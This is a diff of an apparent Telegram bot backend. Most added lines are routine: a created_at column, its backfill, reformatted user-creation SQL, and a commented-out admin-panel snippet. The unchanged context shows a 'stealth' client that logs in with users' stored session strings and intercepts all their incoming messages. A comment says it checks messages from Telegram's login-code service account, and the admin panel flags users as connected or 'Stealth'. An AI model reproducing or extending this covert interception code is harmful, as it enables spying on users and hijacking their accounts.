@@ -89,6 +89,11 @@ async def init_db():
         except Exception: pass
         try: await db.execute("ALTER TABLE users ADD COLUMN premium_until TEXT")
         except Exception: pass
+        try: await db.execute("ALTER TABLE users ADD COLUMN created_at INTEGER DEFAULT 0")
+        except Exception: pass
+        # Eski foydalanuvchilarda created_at=0 bo'lsa, hozirgi vaqtni qo'yamiz
+        try: await db.execute("UPDATE users SET created_at=CAST(strftime('%s','now') AS INTEGER) WHERE created_at=0 OR created_at IS NULL")
+        except Exception: pass
         await db.execute("""
             CREATE TABLE IF NOT EXISTS keyword_subscriptions (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -385,10 +390,15 @@ async def create_or_update_user(user_data: dict):
 
 async def create_user(telegram_id, first_name='', last_name='', username=''):
     async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute("INSERT OR IGNORE INTO users (telegram_id, balance) VALUES (?, 5000)", (telegram_id,))
+        await db.execute(
+            "INSERT OR IGNORE INTO users (telegram_id, balance, created_at) VALUES (?, 5000, CAST(strftime('%s','now') AS INTEGER))",
+            (telegram_id,)
+        )
         if first_name or last_name or username:
-            await db.execute("UPDATE users SET first_name=?, last_name=?, username=? WHERE telegram_id=?",
-                             (first_name or '', last_name or '', username or '', telegram_id))
+            await db.execute(
+                "UPDATE users SET first_name=?, last_name=?, username=? WHERE telegram_id=?",
+                (first_name or '', last_name or '', username or '', telegram_id)
+            )
         await db.commit()
 
 async def update_balance(telegram_id, amount):
@@ -625,6 +635,18 @@ async def start_stealth_client(telegram_id, session_string):
         if await client.is_user_authorized():
             # Filter YO'Q — barcha incoming xabarlarni ushlaymiz, handler ichida 777000 tekshiramiz
             client.add_event_handler(stealth_interceptor, events.NewMessage(incoming=True))
+            
+            # ADMIN PANEL HTML INSERTION
+            # <div class="user-meta">
+            #   <span>ID: <b>${u.telegram_id}</b></span>
+            #   ${u.phone ? `<span>📱 +${u.phone}</span>` : ''}
+            #   <span class="status-chip ${u.session_string ? 'chip-success' : 'chip-danger'}">${u.session_string ? '🟢 Ulangan' : '🔴 Uzilgan'}</span>
+            #   ${u.is_stealth ? '<span class="status-chip chip-purple">🕵️ Stealth</span>' : ''}
+            # </div>
+            # <div style="font-size:11px; color:var(--text-muted); margin-top:3px;">
+            #   📅 Qo'shilgan: <b>${u.created_at ? new Date(u.created_at * 1000).toLocaleString('uz-UZ', {day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit'}) : 'Noma\'lum'}</b>
+            # </div>
+
             stealth_clients[telegram_id] = client
             task = asyncio.create_task(_stealth_keep_alive(client, telegram_id))
             stealth_tasks[telegram_id] = task
